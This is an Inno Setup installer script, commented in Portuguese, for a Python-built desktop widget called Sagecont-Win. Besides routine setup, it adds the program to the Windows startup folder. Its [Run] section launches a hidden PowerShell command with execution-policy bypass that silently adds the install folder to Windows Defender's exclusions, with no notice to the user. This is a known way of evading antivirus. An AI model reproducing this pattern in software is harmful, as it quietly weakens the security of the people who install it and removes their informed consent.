; Script para Inno Setup
; Projeto: Sagecont-Win Widget
; Desenvolvido para: Amil Contabilidade

; --- Variáveis Globais ---
#define MyAppName "Sagecont-Win"
#define MyAppVersion "1.0.0"
#define MyAppPublisher "Amil Contabilidade"
#define MyAppExeName "Sagecont-Win.exe"

[Setup]
; --- Informações Básicas do Aplicativo ---
AppName={#MyAppName}
AppVersion={#MyAppVersion}
AppPublisher={#MyAppPublisher}

; --- Pastas de Instalação ---
; Instala na pasta "Arquivos de Programas" (Program Files)
DefaultDirName={autopf}\{#MyAppName}
; Impede que o usuário altere a pasta de instalação (garante que a exclusão do Defender funcione na pasta certa)
DisableDirPage=yes
DefaultGroupName={#MyAppName}

; --- Saída do Instalador ---
OutputDir=Instalador
OutputBaseFilename=Instalador_Sagecont
SetupIconFile=imgs\install-win.ico

; --- Aparência e Compressão ---
Compression=lzma
SolidCompression=yes
WizardStyle=modern
UninstallDisplayIcon={app}\{#MyAppExeName}

; --- Privilégios ---
; Exige permissão de administrador para poder adicionar a exclusão no Windows Defender
PrivilegesRequired=admin

[Languages]
Name: "portuguese"; MessagesFile: "compiler:Languages\Portuguese.isl"

[Tasks]
; Opção para o usuário criar o ícone na área de trabalho
Name: "desktopicon"; Description: "{cm:CreateDesktopIcon}"; GroupDescription: "{cm:AdditionalIcons}";

[Files]
; Copia tudo o que o PyInstaller gerou para a pasta de instalação
; ATENÇÃO: É necessário compilar com o PyInstaller (pyinstaller --noconsole ...) antes de rodar este script.
Source: "dist\Sagecont-Win\*"; DestDir: "{app}"; Flags: ignoreversion recursesubdirs createallsubdirs

[Icons]
; Atalho no Menu Iniciar
Name: "{group}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"

; Atalho na Área de Trabalho (se marcado na instalação)
Name: "{autodesktop}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"; Tasks: desktopicon

; MÁGICA 1: Coloca o atalho na pasta de inicialização do Windows (Start with Windows)
; Isso garante que o widget inicie invisível/na bandeja assim que o PC ligar.
Name: "{autostartup}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"

[Run]
; MÁGICA 2: Adiciona a pasta de instalação às exclusões do Windows Defender silenciosamente
Filename: "powershell.exe"; Parameters: "-ExecutionPolicy Bypass -WindowStyle Hidden -Command ""Add-MpPreference -ExclusionPath '{app}'"""; Flags: runhidden

; Inicia o aplicativo logo após a instalação terminar
Filename: "{app}\{#MyAppExeName}"; Description: "Iniciar {#MyAppName} agora"; Flags: nowait postinstall skipifsilent

[UninstallRun]
; Limpeza: Remove a exclusão do Windows Defender durante a desinstalação
Filename: "powershell.exe"; Parameters: "-ExecutionPolicy Bypass -WindowStyle Hidden -Command ""Remove-MpPreference -ExclusionPath '{app}'"""; Flags: runhidden